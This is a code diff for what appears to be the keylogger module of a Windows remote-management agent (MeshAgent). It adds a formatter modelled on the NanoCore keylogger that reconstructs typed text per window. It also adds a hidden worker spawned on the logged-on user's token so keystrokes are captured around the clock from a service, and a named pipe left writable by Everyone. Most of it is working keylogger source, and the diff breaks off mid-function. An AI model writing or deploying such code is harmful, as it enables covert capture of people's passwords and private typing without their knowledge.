@@ -2,11 +2,18 @@
  *
  * A WH_KEYBOARD_LL hook on a dedicated thread captures every key press
  * (including from the interactive user session when the agent runs as
- * a service). Each key produces one text line:
+ * a service). A stateful formatter turns the raw key stream into
+ * readable lines (NanoCore keylogger style):
  *
- *     YYYY-MM-DD HH:MM:SS.mmm  <char or [Name]>  <mods>  <foreground window>
+ *     YYYY-MM-DD HH:MM:SS  -  Window: <foreground window>   (window changed)
+ *     YYYY-MM-DD HH:MM:SS  -  <typed text>
  *
- * Lines are appended to a rolling, date-named log file
+ * Typed text accumulates in a buffer and is flushed as a line on Enter,
+ * on a window change, when the buffer approaches its limit, or after
+ * KEYLOG_FMT_STALE_MS of idle time. Backspace removes the last UTF-8
+ * character from the pending text; other special keys are appended
+ * inline as [Name] (Ctrl+letter as [Ctrl+X]). Lines are appended to a
+ * rolling, date-named log file
  * (keylog-YYYY-MM-DD.log, rotated to -1/-2 at the size limit) in the
  * agent directory, and the most recent lines are kept in an in-memory
  * ring buffer that JavaScript polls for live streams.
@@ -26,12 +33,15 @@
 #ifdef WIN32
 
 #include <windows.h>
+#include <WtsApi32.h>
+#include <sddl.h>
 #ifndef LLKHF_REPEAT
 #define LLKHF_REPEAT 0x0001
 #endif
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdarg.h>
 
 #define KEYLOG_RING_LINES 4096
 #define KEYLOG_LINE_MAX 384
@@ -43,6 +53,10 @@
 #define KEYLOG_MAX_MAX_FILE (256 * 1024 * 1024)
 #define KEYLOG_MAX_LIST 128
 #define KEYLOG_STOP_WAIT_MS 10000
+#define KEYLOG_PIPE_NAME L"\\\\.\\pipe\\mckeylog"
+#define KEYLOG_PIPE_RECORD 400
+#define KEYLOG_PIPE_BUFFER 65536
+#define KEYLOG_SPAWN_RETRY_MS 3000
 
 typedef struct KeylogLine
 {
@@ -80,6 +94,11 @@ typedef struct Keylog
 
     unsigned long long totalKeys;
     char lastError[KEYLOG_LINE_MAX];
+
+    /* User-session worker (only used when the agent runs in session 0). */
+    HANDLE pipeRead;
+    HANDLE workerProc;
+    DWORD workerPid;
 } Keylog;
 
 static Keylog g_kl;
@@ -94,6 +113,9 @@ static void Keylog_EnsureInit(void)
     {
         InitializeCriticalSection(&g_kl.cs);
         g_kl.stopEvent = CreateEventW(NULL, TRUE, TRUE, NULL);
+        g_kl.pipeRead = NULL;
+        g_kl.workerProc = NULL;
+        g_kl.workerPid = 0;
         g_kl.maxFileSize = KEYLOG_DEFAULT_MAX_FILE;
         g_kl.currentDate[0] = 0;
         g_kl.dir[0] = '.';
@@ -212,17 +234,6 @@ static void Keylog_KeyName(WORD vk, char *out, int outLen)
         return;
     }
     snprintf(out, outLen, "[VK_0x%02X]", (unsigned int)vk);
-}
-
-static void Keylog_Modifiers(char *out, int outLen)
-{
-    char *p = out;
-    out[0] = 0;
-    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) { p += (int)snprintf(p, outLen - (int)(p - out), "%sCTRL", (p > out) ? "+" : ""); }
-    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) { p += (int)snprintf(p, outLen - (int)(p - out), "%sSHIFT", (p > out) ? "+" : ""); }
-    if (GetAsyncKeyState(VK_MENU) & 0x8000) { p += (int)snprintf(p, outLen - (int)(p - out), "%sALT", (p > out) ? "+" : ""); }
-    if ((GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000)) { p += (int)snprintf(p, outLen - (int)(p - out), "%sWIN", (p > out) ? "+" : ""); }
-    if (p == out) { snprintf(out, outLen, "-"); }
 }
 
 static int Keylog_TryChar(WORD vk, WORD scan, DWORD hookFlags, wchar_t *wc)
@@ -356,43 +367,344 @@ static void Keylog_RotateSize(void)
 /* Capture (hook thread)                                               */
 /* ------------------------------------------------------------------ */
 
-static void Keylog_CaptureKey(WORD vk, WORD scan, DWORD flags)
+/* Append-only debug log (diagnosing session-0 attach / hook issues). */
+static void Keylog_Dbg(const char *fmt, ...)
 {
-    char line[KEYLOG_LINE_MAX];
+    char path[KEYLOG_PATH_MAX];
+    char msg[256];
     char ts[32];
-    char key[64];
-    char mods[32];
-    char window[KEYLOG_WINDOW_MAX + 8];
-    char date[16];
-    wchar_t wc[2];
+    va_list ap;
     SYSTEMTIME st;
-    int n;
-    int cl;
-
+    FILE *f;
+    va_start(ap, fmt);
+    vsnprintf(msg, sizeof(msg), fmt, ap);
+    va_end(ap);
     GetLocalTime(&st);
-    snprintf(ts, sizeof(ts), "%04u-%02u-%02u %02u:%02u:%02u.%03u",
-        (unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay,
-        (unsigned int)st.wHour, (unsigned int)st.wMinute, (unsigned int)st.wSecond,
-        (unsigned int)st.wMilliseconds);
-    snprintf(date, sizeof(date), "%04u-%02u-%02u", (unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay);
+    snprintf(ts, sizeof(ts), "%02u:%02u:%02u.%03u",
+        (unsigned int)st.wHour, (unsigned int)st.wMinute,
+        (unsigned int)st.wSecond, (unsigned int)st.wMilliseconds);
+    snprintf(path, sizeof(path), "%s\\keylog-debug.log", g_kl.dir);
+    f = fopen(path, "ab");
+    if (f == NULL) { return; }
+    fprintf(f, "%s %s\n", ts, msg);
+    fclose(f);
+}
 
-    n = Keylog_TryChar(vk, scan, flags, wc);
-    if ((n == 1) && ((wc[0] & 0xFC00) == 0) && (wc[0] >= 0x20))
+static void Keylog_DeskName(HDESK d, char *out, int outLen)
+{
+    wchar_t w[64];
+    if (d == NULL)
     {
-        cl = WideCharToMultiByte(CP_UTF8, 0, wc, 1, key, (int)sizeof(key) - 1, NULL, NULL);
-        if (cl > 0) { key[cl] = 0; }
-        else { snprintf(key, sizeof(key), "[U+%04X]", (unsigned int)wc[0]); }
+        snprintf(out, outLen, "(null)");
+        return;
+    }
+    if (GetUserObjectInformationW((HANDLE)d, UOI_NAME, w, 63, NULL) != FALSE)
+    {
+        Keylog_WideToUtf8(w, out, outLen);
     }
     else
     {
-        Keylog_KeyName(vk, key, (int)sizeof(key));
+        snprintf(out, outLen, "(err)");
     }
-    Keylog_Modifiers(mods, sizeof(mods));
-    Keylog_WindowTitle(window, sizeof(window));
-    snprintf(line, sizeof(line), "%s  %s  %s  %s", ts, key, mods, window);
+}
 
+/* Attach the calling thread to the input desktop of the session that is
+ * currently attached to the console. When the agent runs as a service in
+ * session 0, its threads sit on the service-session desktop where no
+ * interactive keyboard input arrives, so a low-level hook installed there
+ * never sees the user's keys. OpenInputDesktop resolves to the active
+ * session's input desktop, which makes the hook (and GetForegroundWindow /
+ * EnumWindows on this thread) see the interactive user's input. This is the
+ * same pattern the agent's KVM module uses. It is a no-op when the agent
+ * already runs in an interactive session. */
+static void Keylog_AttachToInputDesktop(void)
+{
+    HDESK input = OpenInputDesktop(0, TRUE,
+        DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW | DESKTOP_ENUMERATE |
+        DESKTOP_HOOKCONTROL | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
+        DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
+    DWORD errIn = GetLastError();
+    HDESK old;
+    static DWORD lastDbg = 0;
+    DWORD now = GetTickCount();
+    char n1[32];
+    char n2[32];
+    int logThis = (lastDbg == 0) || ((now - lastDbg) >= 15000) || (input != NULL);
+    if (logThis) { lastDbg = now; }
+
+    if (input == NULL)
+    {
+        if (logThis) { Keylog_Dbg("attach: OpenInputDesktop FAILED err=%lu", (unsigned long)errIn); }
+        return;
+    }
+    old = GetThreadDesktop(GetCurrentThreadId());
+    if (logThis)
+    {
+        Keylog_DeskName(input, n1, sizeof(n1));
+        Keylog_DeskName(old, n2, sizeof(n2));
+        Keylog_Dbg("attach: input=[%s] old=[%s] same=%d", n1, n2, (int)(old == input));
+    }
+    if (old == input)
+    {
+        if (old != NULL) { CloseDesktop(old); }
+        CloseDesktop(input);
+        return;
+    }
+    if (SetThreadDesktop(input) == FALSE)
+    {
+        DWORD errSet = GetLastError();
+        /* Usually ERROR_ACCESS_DENIED when the thread is already attached
+         * to this very desktop; the current attachment stays in place. */
+        if (logThis) { Keylog_Dbg("attach: SetThreadDesktop FAILED err=%lu", (unsigned long)errSet); }
+        CloseDesktop(input);
+    }
+    else
+    {
+        if (logThis)
+        {
+            Keylog_DeskName(GetThreadDesktop(GetCurrentThreadId()), n1, sizeof(n1));
+            Keylog_Dbg("attach: SetThreadDesktop OK now=[%s]", n1);
+        }
+    }
+    if (old != NULL) { CloseDesktop(old); }
+}
+
+/* ------------------------------------------------------------------ */
+/* Stateful formatter (NanoCore keylogger style)                       */
+/*                                                                     */
+/* Each key event is fed to Keylog_FormatKey, which accumulates        */
+/* printable characters in a text buffer and emits 0..2 fully formed   */
+/* lines: a "Window: <title>" marker when the foreground window        */
+/* changes (flushing pending text first) and the accumulated text when */
+/* it is closed off by Enter, by a window change, when the buffer      */
+/* approaches KEYLOG_FMT_TEXT_MAX, or after KEYLOG_FMT_STALE_MS of     */
+/* idle time (Keylog_FormatTick, called from the pump loops).          */
+/* Backspace strips the last UTF-8 character of the pending text;      */
+/* other special keys are appended inline as [Name], Ctrl+letter as    */
+/* [Ctrl+X]. Modifier keys are not logged on their own.                */
+/*                                                                     */
+/* Every line is prefixed with "YYYY-MM-DD HH:MM:SS  -  " (Keylog_     */
+/* StoreLine derives the log file date from the first 10 characters).  */
+/* Lines stay under KEYLOG_PIPE_RECORD so a single pipe record can     */
+/* carry one. The worker-side and agent-side formatters are each       */
+/* touched by a single thread only (the LL hook callback is delivered  */
+/* on the thread that installed the hook, which is also the pump       */
+/* loop thread).                                                       */
+/* ------------------------------------------------------------------ */
+
+#define KEYLOG_FMT_TEXT_MAX 320
+#define KEYLOG_FMT_STALE_MS 1500
+#define KEYLOG_FMT_TICK_MS 250
+
+typedef struct KeylogEmit
+{
+    char text[KEYLOG_LINE_MAX + 1];
+    unsigned short keys; /* key events this line represents (0 = marker) */
+} KeylogEmit;
+
+typedef struct KeylogFormatter
+{
+    char window[KEYLOG_WINDOW_MAX + 1];
+    char text[KEYLOG_FMT_TEXT_MAX + 1];
+    int textLen;
+    unsigned int keysSinceFlush;
+    DWORD lastActivity; /* 0 while the buffer is empty */
+} KeylogFormatter;
+
+static KeylogFormatter g_fmt;
+
+static void Keylog_FmtReset(void)
+{
+    memset(&g_fmt, 0, sizeof(g_fmt));
+}
+
+static void Keylog_FmtTs(char *ts, int tsLen)
+{
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    snprintf(ts, tsLen, "%04u-%02u-%02u %02u:%02u:%02u",
+        (unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay,
+        (unsigned int)st.wHour, (unsigned int)st.wMinute, (unsigned int)st.wSecond);
+}
+
+static void Keylog_FmtEmit(KeylogEmit *out, int *outCount, unsigned short keys, const char *ts, const char *body)
+{
+    if (*outCount < 3)
+    {
+        snprintf(out[*outCount].text, KEYLOG_LINE_MAX + 1, "%s  -  %s", ts, body);
+        out[*outCount].keys = keys;
+        (*outCount)++;
+    }
+}
+
+static void Keylog_FmtFlushText(KeylogFormatter *f, KeylogEmit *out, int *outCount, const char *ts)
+{
+    if (f->textLen > 0)
+    {
+        f->text[f->textLen] = 0;
+        Keylog_FmtEmit(out, outCount, (unsigned short)f->keysSinceFlush, ts, f->text);
+        f->textLen = 0;
+        f->text[0] = 0;
+        f->keysSinceFlush = 0;
+    }
+}
+
+static void Keylog_FmtAppend(KeylogFormatter *f, const char *s, KeylogEmit *out, int *outCount, const char *ts)
+{
+    int len = (int)strlen(s);
+    if (len > KEYLOG_FMT_TEXT_MAX) { len = KEYLOG_FMT_TEXT_MAX; }
+    if ((f->textLen + len) > KEYLOG_FMT_TEXT_MAX)
+    {
+        /* Buffer nearly full: flush what is pending, then start a new one. */
+        Keylog_FmtFlushText(f, out, outCount, ts);
+    }
+    if (len > (KEYLOG_FMT_TEXT_MAX - f->textLen)) { len = (KEYLOG_FMT_TEXT_MAX - f->textLen); }
+    if (len > 0)
+    {
+        memcpy(f->text + f->textLen, s, (size_t)len);
+        f->textLen += len;
+        f->text[f->textLen] = 0;
+    }
+}
+
+/* Feed one physical key event into the formatter. Returns the number of
+ * lines produced in out (0..2); the caller stores or relays each line. */
+static int Keylog_FormatKey(WORD vk, WORD scan, DWORD flags, KeylogEmit out[3])
+{
+    KeylogFormatter *f = &g_fmt;
+    char ts[32];
+    char buf[32];
+    char window[KEYLOG_WINDOW_MAX + 1];
+    wchar_t wc[2];
+    int count = 0;
+    int n;
+    int charCount;
+    int isMod;
+    int isCtrl;
+
+    static volatile LONG s_capCount = 0;
+    LONG nc;
+    nc = InterlockedIncrement(&s_capCount);
+    if (nc <= 5)
+    {
+        Keylog_Dbg("capture #%ld vk=0x%02x", (long)nc, (unsigned int)vk);
+    }
+
+    isCtrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+    isMod = (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU ||
+             vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_LCONTROL || vk == VK_RCONTROL ||
+             vk == VK_LMENU || vk == VK_RMENU || vk == VK_LWIN || vk == VK_RWIN);
+    Keylog_FmtTs(ts, sizeof(ts));
+
+    /* Foreground window changed: close off the pending text, then mark it. */
+    if (!isMod && (vk != 0x08))
+    {
+        Keylog_WindowTitle(window, sizeof(window));
+        if ((window[0] != 0) && (strcmp(f->window, window) != 0))
+        {
+            char body[KEYLOG_LINE_MAX];
+            Keylog_FmtFlushText(f, out, &count, ts);
+            snprintf(body, sizeof(body), "Window: %s", window);
+            Keylog_FmtEmit(out, &count, 0, ts, body);
+            snprintf(f->window, sizeof(f->window), "%s", window);
+        }
+    }
+
+    n = Keylog_TryChar(vk, scan, flags, wc);
+    charCount = 0;
+    if ((n >= 1) && (wc[0] >= 0x20))
+    {
+        if ((wc[0] & 0xFC00) == 0) { charCount = 1; }
+        else if (((wc[0] & 0xFC00) == 0xD800) && (n == 2) && ((wc[1] & 0xFC00) == 0xDC00)) { charCount = 2; }
+    }
+
+    if (isCtrl && ((vk >= 'A') && (vk <= 'Z')))
+    {
+        /* Ctrl+letter shortcuts: ToUnicodeEx usually yields no character,
+         * so record the combo explicitly. */
+        snprintf(buf, sizeof(buf), "[Ctrl+%c]", (char)vk);
+        Keylog_FmtAppend(f, buf, out, &count, ts);
+    }
+    else if (isCtrl && ((vk >= '0') && (vk <= '9') || (vk >= VK_NUMPAD0) && (vk <= VK_NUMPAD9)))
+    {
+        char d = (vk <= '9') ? (char)vk : (char)('0' + (vk - VK_NUMPAD0));
+        snprintf(buf, sizeof(buf), "[Ctrl+%c]", d);
+        Keylog_FmtAppend(f, buf, out, &count, ts);
+    }
+    else if (charCount > 0)
+    {
+        wchar_t wbuf[3];
+        char utf8[8];
+        int cl;
+        wbuf[0] = wc[0];
+        wbuf[1] = wc[1];
+        cl = WideCharToMultiByte(CP_UTF8, 0, wbuf, charCount, utf8, (int)sizeof(utf8) - 1, NULL, NULL);
+        if (cl > 0)
+        {
+            utf8[cl] = 0;
+            Keylog_FmtAppend(f, utf8, out, &count, ts);
+        }
+    }
+    else if (vk == 0x0D)
+    {
+        /* Enter: the line break itself closes the current line. */
+        Keylog_FmtFlushText(f, out, &count, ts);
+    }
+    else if (vk == 0x08)
+    {
+        /* Backspace: undo the last UTF-8 character. */
+        int i = f->textLen - 1;
+        while ((i >= 0) && ((f->text[i] & 0xC0) == 0x80)) { i--; }
+        f->textLen = (i >= 0) ? i : 0;
+        f->text[f->textLen] = 0;
+    }
+    else if ((n >= 0) && !isMod)
+    {
+        /* Other special keys inline: [Tab] [Up] [F5] [Esc] [Delete] ... */
+        char name[64];
+        Keylog_KeyName(vk, name, (int)sizeof(name));
+        snprintf(buf, sizeof(buf), "%s%s", isCtrl ? "Ctrl+" : "", name);
+        Keylog_FmtAppend(f, buf, out, &count, ts);
+    }
+
+    f->keysSinceFlush++;
+    f->lastActivity = GetTickCount();
+    return count;
+}
+
+/* Idle-time flush. Call periodically (~KEYLOG_FMT_TICK_MS); returns the
+ * number of lines produced (0 or 1). */
+static int Keylog_FormatTick(KeylogEmit out[2])
+{
+    KeylogFormatter *f = &g_fmt;
+    char ts[32];
+    int count = 0;
+    if ((f->textLen > 0) && ((GetTickCount() - f->lastActivity) >= KEYLOG_FMT_STALE_MS))
+    {
+        Keylog_FmtTs(ts, sizeof(ts));
+        Keylog_FmtFlushText(f, out, &count, ts);
+    }
+    return count;
+}
+
+/* Flush any pending text and reset the formatter (used on stop/start). */
+static int Keylog_FormatFlushAll(KeylogEmit out[2])
+{
+    KeylogFormatter *f = &g_fmt;
+    char ts[32];
+    int count = 0;
+    Keylog_FmtTs(ts, sizeof(ts));
+    Keylog_FmtFlushText(f, out, &count, ts);
+    f->window[0] = 0;
+    return count;
+}
+
+/* Store one formatted line in the ring buffer and the rolling log file. */
+static void Keylog_StoreLine(const char *line)
+{
     EnterCriticalSection(&g_kl.cs);
     {
+        char date[16];
         unsigned int idx = (g_kl.ringHead + g_kl.ringCount) % KEYLOG_RING_LINES;
         if (g_kl.ringCount == KEYLOG_RING_LINES)
         {
@@ -403,8 +715,9 @@ static void Keylog_CaptureKey(WORD vk, WORD scan, DWORD flags)
         strncpy(g_kl.ring[idx].text, line, KEYLOG_LINE_MAX - 1);
         g_kl.ring[idx].text[KEYLOG_LINE_MAX - 1] = 0;
         if (g_kl.ringCount < KEYLOG_RING_LINES) { g_kl.ringCount++; }
-        g_kl.totalKeys++;
 
+        snprintf(date, sizeof(date), "%s", line);
+        date[10] = 0;
         if (strcmp(date, g_kl.currentDate) != 0)
         {
             Keylog_CloseCurrent();
@@ -413,18 +726,41 @@ static void Keylog_CaptureKey(WORD vk, WORD scan, DWORD flags)
         }
         if (g_kl.current != NULL)
         {
-            fwrite(line, 1, strlen(line) + 1, g_kl.current);
+            size_t len = strlen(line);
+            /* Newline-terminated so the log files are plain text that any
+             * editor or script can read. */
+            fwrite(line, 1, len, g_kl.current);
+            fputc('\n', g_kl.current);
             fflush(g_kl.current);
-            g_kl.currentSize += strlen(line) + 1;
+            g_kl.currentSize += len + 1;
             if (g_kl.currentSize >= g_kl.maxFileSize) { Keylog_RotateSize(); }
         }
     }
     LeaveCriticalSection(&g_kl.cs);
 }
 
+static void Keylog_CaptureKey(WORD vk, WORD scan, DWORD flags)
+{
+    KeylogEmit e[3];
+    int n = Keylog_FormatKey(vk, scan, flags, e);
+    int i;
+    if (n > 0)
+    {
+        EnterCriticalSection(&g_kl.cs);
+        for (i = 0; i < n; i++) { g_kl.totalKeys += e[i].keys; }
+        LeaveCriticalSection(&g_kl.cs);
+    }
+    for (i = 0; i < n; i++)
+    {
+        Keylog_StoreLine(e[i].text);
+    }
+}
+
 static LRESULT CALLBACK Keylog_HookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN))
+    static volatile LONG s_cbCount = 0;
+    LONG n;
+    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
     {
         KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
         if ((kb->flags & LLKHF_REPEAT) == 0)
@@ -432,7 +768,250 @@ static LRESULT CALLBACK Keylog_HookProc(int nCode, WPARAM wParam, LPARAM lParam)
             Keylog_CaptureKey((WORD)kb->vkCode, (WORD)kb->scanCode, kb->flags);
         }
     }
+    n = InterlockedIncrement(&s_cbCount);
+    if (n <= 40)
+    {
+        Keylog_Dbg("hook cb #%ld nCode=%d w=0x%lx", (long)n, (int)nCode, (unsigned long)wParam);
+    }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+/* ------------------------------------------------------------------ */
+/* User-session worker                                                 */
+/*                                                                     */
+/* From a session 0 (service) context OpenInputDesktop cannot reach    */
+/* the console session's input desktop, so a low-level hook installed  */
+/* here never sees the user's keys. The fix is a small worker process  */
+/* (this same executable, launched as "MeshAgent.exe keylog-worker")   */
+/* created with CreateProcessAsUser on the console user's token. The   */
+/* worker lives in the interactive session, installs the same hook     */
+/* (naturally on that session's desktop) and sends each formatted line */
+/* to the agent over the named pipe KEYLOG_PIPE_NAME. The agent then   */
+/* stores the line exactly as if its own hook had captured it. The     */
+/* worker dies when the user logs off; the agent re-spawns it on the   */
+/* next logon, so keylogging keeps running 24/7.                       */
+/* ------------------------------------------------------------------ */
+
+static HANDLE g_workerPipe = INVALID_HANDLE_VALUE;
+
+/* Send one formatted line to the agent. Record layout: a 2-byte little-
+ * endian key count (0 for window markers) followed by the line text. */
+static void Keylog_WorkerSend(const KeylogEmit *e)
+{
+    unsigned char rec[KEYLOG_PIPE_RECORD];
+    DWORD wr = 0;
+    memset(rec, 0, sizeof(rec));
+    rec[0] = (unsigned char)(e->keys & 0xFF);
+    rec[1] = (unsigned char)((e->keys >> 8) & 0xFF);
+    strncpy((char*)(rec + 2), e->text, KEYLOG_PIPE_RECORD - 3);
+    if (WriteFile(g_workerPipe, rec, sizeof(rec), &wr, NULL) == FALSE || wr != (DWORD)sizeof(rec))
+    {
+        Keylog_Dbg("worker: pipe write failed err=%lu, exiting", (unsigned long)GetLastError());
+        exit(1);
+    }
+}
+
+static LRESULT CALLBACK Keylog_WorkerHookProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
+    {
+        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
+        if ((kb->flags & LLKHF_REPEAT) == 0)
+        {
+            KeylogEmit e[3];
+            int n = Keylog_FormatKey((WORD)kb->vkCode, (WORD)kb->scanCode, kb->flags, e);
+            int i;
+            for (i = 0; i < n; i++)
+            {
+                Keylog_WorkerSend(&e[i]);
+            }
+        }
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int ILibDuktape_KeyloggerWorker_Run(int argc, char **argv)
+{
+    int windowTitles = 1;
+    HHOOK hook;
+    MSG msg;
+    DWORD lastTick = 0;
+
+    (void)argc;
+    if ((argc > 2) && (argv[2] != NULL) && (argv[2][0] == '0')) { windowTitles = 0; }
+    Keylog_EnsureInit();
+    Keylog_DefaultDir(g_kl.dir, sizeof(g_kl.dir));
+    g_kl.windowTitles = windowTitles;
+
+    /* Connect to the agent's pipe (it creates it before spawning us). */
+    g_workerPipe = INVALID_HANDLE_VALUE;
+    for (int tries = 0; tries < 100 && g_workerPipe == INVALID_HANDLE_VALUE; tries++)
+    {
+        g_workerPipe = CreateFileW(KEYLOG_PIPE_NAME, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (g_workerPipe == INVALID_HANDLE_VALUE) { Sleep(100); }
+    }
+    if (g_workerPipe == INVALID_HANDLE_VALUE)
+    {
+        Keylog_Dbg("worker: pipe connect FAILED err=%lu", (unsigned long)GetLastError());
+        return 2;
+    }
+    Keylog_Dbg("worker: started pid=%lu", (unsigned long)GetCurrentProcessId());
+
+    hook = SetWindowsHookExW(WH_KEYBOARD_LL, Keylog_WorkerHookProc, GetModuleHandleW(NULL), 0);
+    if (hook == NULL)
+    {
+        Keylog_Dbg("worker: SetWindowsHookEx FAILED err=%lu", (unsigned long)GetLastError());
+        CloseHandle(g_workerPipe);
+        return 3;
+    }
+    Keylog_Dbg("worker: hook installed");
+    for (;;)
+    {
+        DWORD now = GetTickCount();
+        if ((now - lastTick) >= KEYLOG_FMT_TICK_MS)
+        {
+            /* Flush text that has been sitting in the buffer (user stopped
+             * typing for a while) so it reaches the agent promptly. */
+            lastTick = now;
+            KeylogEmit e[2];
+            int n = Keylog_FormatTick(e);
+            int i;
+            for (i = 0; i < n; i++)
+            {
+                Keylog_WorkerSend(&e[i]);
+            }
+        }
+        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE) != FALSE)
+        {
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+        Sleep(10);
+    }
+}
+
+/* Tear down the worker process and the pipe. */
+static void Keylog_WorkerClean(Keylog *kl)
+{
+    if (kl->workerProc != NULL)
+    {
+        if (WaitForSingleObject(kl->workerProc, 2000) != WAIT_OBJECT_0)
+        {
+            TerminateProcess(kl->workerProc, 0);
+            WaitForSingleObject(kl->workerProc, 1000);
+        }
+        CloseHandle(kl->workerProc);
+        kl->workerProc = NULL;
+        kl->workerPid = 0;
+    }
+    if (kl->pipeRead != NULL)
+    {
+        CloseHandle(kl->pipeRead);
+        kl->pipeRead = NULL;
+    }
+}
+
+/* Create the pipe and spawn the worker in the console user's session.
+ * Safe to call when no user is logged on: WTSQueryUserToken fails and
+ * the caller simply retries later. */
+static void Keylog_WorkerSpawn(Keylog *kl)
+{
+    wchar_t exe[1024];
+    wchar_t cmd[1200];
+    wchar_t wdir[KEYLOG_NAME_MAX];
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    DWORD console;
+    HANDLE token = NULL;
+    HANDLE dup = NULL;
+
+    Keylog_WorkerClean(kl);
+
+    console = WTSGetActiveConsoleSessionId();
+    if (WTSQueryUserToken(console, &token) == FALSE)
+    {
+        Keylog_Dbg("worker: WTSQueryUserToken FAILED err=%lu console=%lu",
+            (unsigned long)GetLastError(), (unsigned long)console);
+        return;
+    }
+    if (DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup) == FALSE)
+    {
+        Keylog_Dbg("worker: DuplicateTokenEx FAILED err=%lu", (unsigned long)GetLastError());
+        CloseHandle(token);
+        return;
+    }
+    if (SetTokenInformation(dup, TokenSessionId, &console, sizeof(console)) == FALSE)
+    {
+        Keylog_Dbg("worker: SetTokenInformation FAILED err=%lu", (unsigned long)GetLastError());
+    }
+
+    /* The pipe must exist before the worker is spawned (it connects by name).
+     * A pipe created by a SYSTEM service is, by default, not writable from
+     * a medium-integrity user session (err=5 on the client side), so grant
+     * an explicit ACE to Everyone in the DACL. */
+    {
+        SECURITY_ATTRIBUTES sa;
+        PSECURITY_DESCRIPTOR sd = NULL;
+        ZeroMemory(&sa, sizeof(sa));
+        sa.nLength = sizeof(sa);
+        sa.bInheritHandle = FALSE;
+        if (ConvertStringSecurityDescriptorToSecurityDescriptorA(
+            "D:(A;;GRGW;;;WD)(A;;GA;;;SY)(A;;GA;;;BA)", SDDL_REVISION_1, &sd, NULL) == FALSE)
+        {
+            Keylog_Dbg("worker: SDDL convert FAILED err=%lu", (unsigned long)GetLastError());
+        }
+        else
+        {
+            sa.lpSecurityDescriptor = sd;
+        }
+        kl->pipeRead = CreateNamedPipeW(KEYLOG_PIPE_NAME,
+            PIPE_ACCESS_INBOUND | FILE_FLAG_FIRST_PIPE_INSTANCE,
+            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+            1, 0, KEYLOG_PIPE_BUFFER, 0, &sa);
+        if (kl->pipeRead == INVALID_HANDLE_VALUE)
+        {
+            Keylog_Dbg("worker: pipe create FAILED err=%lu", (unsigned long)GetLastError());
+            kl->pipeRead = NULL;
+            if (sd != NULL) { LocalFree(sd); }
+            CloseHandle(dup);
+            CloseHandle(token);
+            return;
+        }
+        if (sd != NULL) { LocalFree(sd); }
+    }
+
+    if (GetModuleFileNameW(NULL, exe, 1023) <= 0)
+    {
+        Keylog_Dbg("worker: GetModuleFileName FAILED err=%lu", (unsigned long)GetLastError());
+        goto fail;
+    }
+    swprintf(cmd, 1199, L"\"%s\" keylog-worker %d", exe, g_kl.windowTitles);
+    Keylog_Utf8ToWide(g_kl.dir, wdir, (int)(sizeof(wdir) / sizeof(wdir[0])));
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    ZeroMemory(&pi, sizeof(pi));
+    if (CreateProcessAsUserW(dup, exe, cmd, NULL, NULL, FALSE, 0, NULL, wdir, &si, &pi) == FALSE)
+    {
+        Keylog_Dbg("worker: CreateProcessAsUser FAILED err=%lu", (unsigned long)GetLastError());
+        goto fail;
+    }
+    CloseHandle(pi.hThread);
+    kl->workerProc = pi.hProcess;
+    kl->workerPid = pi.dwProcessId;
+    Keylog_Dbg("worker: spawned pid=%lu console=%lu", (unsigned long)pi.dwProcessId, (unsigned long)console);
+
+    CloseHandle(dup);
+    CloseHandle(token);
+    return;
+
+fail:
+    if (kl->pipeRead != NULL) { CloseHandle(kl->pipeRead); kl->pipeRead = NULL; }
+    CloseHandle(dup);
+    CloseHandle(token);
 }
 
 static DWORD WINAPI Keylog_ThreadProc(LPVOID param)
@@ -440,9 +1019,125 @@ static DWORD WINAPI Keylog_ThreadProc(LPVOID param)
     Keylog *kl = (Keylog*)param;
     MSG msg;
     HHOOK hook;
+    DWORD lastAttach = 0;
+    DWORD lastSpawn = 0;
+    DWORD lastTick = 0;
+    DWORD sess = 0;
+    int session0;
+
+    ProcessIdToSessionId(GetCurrentProcessId(), &sess);
+    session0 = (sess == 0);
+
+    /* Attach to the interactive session's input desktop (no-op when the
+     * agent already runs in an interactive session) and re-check
+     * periodically so the hook follows the console through logins, logoffs
+     * and user switches - the agent itself keeps running 24/7. When the
+     * agent is a session 0 service this attach is not possible, so the
+     * user-session worker does the capturing instead. */
+    Keylog_AttachToInputDesktop();
+    lastAttach = GetTickCount();
     hook = SetWindowsHookExW(WH_KEYBOARD_LL, Keylog_HookProc, GetModuleHandleW(NULL), 0);
+    if (hook == NULL)
+    {
+        Keylog_Dbg("hook: SetWindowsHookEx FAILED err=%lu", (unsigned long)GetLastError());
